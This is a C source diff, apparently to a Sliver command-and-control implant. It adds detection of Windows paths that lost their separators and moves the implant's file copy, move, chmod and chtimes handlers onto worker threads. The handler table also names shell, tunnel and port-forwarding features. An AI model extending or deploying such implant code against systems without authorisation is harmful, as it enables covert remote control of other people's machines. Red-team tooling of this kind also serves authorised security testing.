@@ -397,6 +397,20 @@ int sliver_rpc_handle_token_owner(const sliver_envelope_t *req, sliver_buf_t *ou
 }
 
 /* --- Cp / Mv / Chmod / Chtimes ----------------------------------------- */
+/* A Windows path whose separators were eaten before reaching us arrives as
+ * "C:Windowswin.ini". Report that clearly instead of a bare copy failure. */
+static int path_looks_mangled(const char *p) {
+  if (p == NULL || p[0] == 0) {
+    return 0;
+  }
+#if defined(_WIN32)
+  if (p[1] == ':' && p[2] != 0 && p[2] != '\\' && p[2] != '/') {
+    return 1;
+  }
+#endif
+  return 0;
+}
+
 static int handle_cp_entry(const sliver_envelope_t *req, sliver_buf_t *out) {
   char src[1024];
   char dst[1024];
@@ -409,6 +423,10 @@ static int handle_cp_entry(const sliver_envelope_t *req, sliver_buf_t *out) {
   err[0] = 0;
   if (src[0] == 0 || dst[0] == 0) {
     (void)snprintf(err, sizeof(err), "%s", "cp: missing src or dst");
+  } else if (path_looks_mangled(src) || path_looks_mangled(dst)) {
+    (void)snprintf(err, sizeof(err), "%s",
+                   "cp: path separators were lost before the implant saw them; "
+                   "escape backslashes (C:\\\\Windows\\\\win.ini)");
   } else if (sliver_fs_copy(src, dst, &written) != 0) {
     (void)snprintf(err, sizeof(err), "cp %s -> %s: failed", src, dst);
   }
@@ -427,6 +445,10 @@ static int handle_mv_entry(const sliver_envelope_t *req, sliver_buf_t *out) {
   err[0] = 0;
   if (src[0] == 0 || dst[0] == 0) {
     (void)snprintf(err, sizeof(err), "%s", "mv: missing src or dst");
+  } else if (path_looks_mangled(src) || path_looks_mangled(dst)) {
+    (void)snprintf(err, sizeof(err), "%s",
+                   "mv: path separators were lost before the implant saw them; "
+                   "escape backslashes (C:\\\\Windows\\\\win.ini)");
   } else if (sliver_fs_move(src, dst) != 0) {
     (void)snprintf(err, sizeof(err), "mv %s -> %s: failed", src, dst);
   }
@@ -467,6 +489,112 @@ static int handle_chtimes_entry(const sliver_envelope_t *req, sliver_buf_t *out)
   return sliver_path_resp_encode(out, path, err);
 }
 
+/* --- async wrapper for file operations ---------------------------------- */
+typedef struct {
+  int kind;
+  int64_t envelope_id;
+  uint8_t *data;
+  size_t len;
+} file_job_t;
+
+enum { FILE_JOB_CP = 1, FILE_JOB_MV, FILE_JOB_CHMOD, FILE_JOB_CHTIMES };
+
+static int handle_cp_entry(const sliver_envelope_t *req, sliver_buf_t *out);
+static int handle_mv_entry(const sliver_envelope_t *req, sliver_buf_t *out);
+static int handle_chmod_entry(const sliver_envelope_t *req, sliver_buf_t *out);
+static int handle_chtimes_entry(const sliver_envelope_t *req, sliver_buf_t *out);
+
+static void file_worker(void *arg) {
+  file_job_t *job = (file_job_t *)arg;
+  sliver_envelope_t env;
+  sliver_buf_t resp;
+  uint32_t type = 0;
+  int rc = -1;
+
+  memset(&env, 0, sizeof(env));
+  env.id = job->envelope_id;
+  env.data = job->data;
+  env.data_len = job->len;
+  sliver_buf_init(&resp);
+
+  switch (job->kind) {
+    case FILE_JOB_CP:
+      type = SLIVER_MSG_CP;
+      rc = handle_cp_entry(&env, &resp);
+      break;
+    case FILE_JOB_MV:
+      type = SLIVER_MSG_MV;
+      rc = handle_mv_entry(&env, &resp);
+      break;
+    case FILE_JOB_CHMOD:
+      type = SLIVER_MSG_CHMOD;
+      rc = handle_chmod_entry(&env, &resp);
+      break;
+    case FILE_JOB_CHTIMES:
+      type = SLIVER_MSG_CHTIMES;
+      rc = handle_chtimes_entry(&env, &resp);
+      break;
+    default:
+      break;
+  }
+  if (rc == 0 && g_rpc_send != NULL) {
+    (void)g_rpc_send(job->envelope_id, type, resp.data, resp.len);
+  }
+  sliver_buf_free(&resp);
+  free(job->data);
+  free(job);
+}
+
+/* Copies the request and hands the work to a worker thread so a slow copy never
+ * stalls the session read loop (the peer keepalive would kill the session). */
+static int start_file_job(const sliver_envelope_t *req, int kind) {
+  file_job_t *job = (file_job_t *)calloc(1, sizeof(*job));
+  sliver_thread_t *th;
+
+  if (job == NULL) {
+    return -1;
+  }
+  job->kind = kind;
+  job->envelope_id = req->id;
+  job->len = req->data_len;
+  if (req->data_len != 0) {
+    job->data = (uint8_t *)malloc(req->data_len);
+    if (job->data == NULL) {
+      free(job);
+      return -1;
+    }
+    memcpy(job->data, req->data, req->data_len);
+  }
+  th = sliver_thread_create(file_worker, job);
+  if (th == NULL) {
+    free(job->data);
+    free(job);
+    return -1;
+  }
+  sliver_thread_detach(th);
+  return 0;
+}
+
+static int handle_cp_async(const sliver_envelope_t *req, sliver_buf_t *out) {
+  (void)out;
+  return start_file_job(req, FILE_JOB_CP) == 0 ? -2 : -1;
+}
+
+static int handle_mv_async(const sliver_envelope_t *req, sliver_buf_t *out) {
+  (void)out;
+  return start_file_job(req, FILE_JOB_MV) == 0 ? -2 : -1;
+}
+
+static int handle_chmod_async(const sliver_envelope_t *req, sliver_buf_t *out) {
+  (void)out;
+  return start_file_job(req, FILE_JOB_CHMOD) == 0 ? -2 : -1;
+}
+
+static int handle_chtimes_async(const sliver_envelope_t *req, sliver_buf_t *out) {
+  (void)out;
+  return start_file_job(req, FILE_JOB_CHTIMES) == 0 ? -2 : -1;
+}
+
 /* --- table ------------------------------------------------------------- */
 static const rpc_entry_t g_handlers[] = {
     {SLIVER_MSG_LS_REQ, SLIVER_MSG_LS, sliver_rpc_handle_ls},
@@ -485,10 +613,10 @@ static const rpc_entry_t g_handlers[] = {
     {SLIVER_MSG_TUNNEL_CLOSE, 0, sliver_rpc_handle_tunnel_close},
     {SLIVER_MSG_SHELL_RESIZE_REQ, 0, sliver_rpc_handle_shell_resize},
     {SLIVER_MSG_PORTFWD_REQ, SLIVER_MSG_PORTFWD, sliver_rpc_handle_portfwd},
-    {SLIVER_MSG_CP_REQ, SLIVER_MSG_CP, handle_cp_entry},
-    {SLIVER_MSG_MV_REQ, SLIVER_MSG_MV, handle_mv_entry},
-    {SLIVER_MSG_CHMOD_REQ, SLIVER_MSG_CHMOD, handle_chmod_entry},
-    {SLIVER_MSG_CHTIMES_REQ, SLIVER_MSG_CHTIMES, handle_chtimes_entry},
+    {SLIVER_MSG_CP_REQ, SLIVER_MSG_CP, handle_cp_async},
+    {SLIVER_MSG_MV_REQ, SLIVER_MSG_MV, handle_mv_async},
+    {SLIVER_MSG_CHMOD_REQ, SLIVER_MSG_CHMOD, handle_chmod_async},
+    {SLIVER_MSG_CHTIMES_REQ, SLIVER_MSG_CHTIMES, handle_chtimes_async},
     {SLIVER_MSG_CURRENT_TOKEN_OWNER_REQ, SLIVER_MSG_CURRENT_TOKEN_OWNER,
      sliver_rpc_handle_token_owner},
 };
@@ -544,6 +672,7 @@ void sliver_rpc_dispatch(const sliver_envelope_t *req, sliver_rpc_result_t *resu
     return;
   }
 }
+
 
 
 
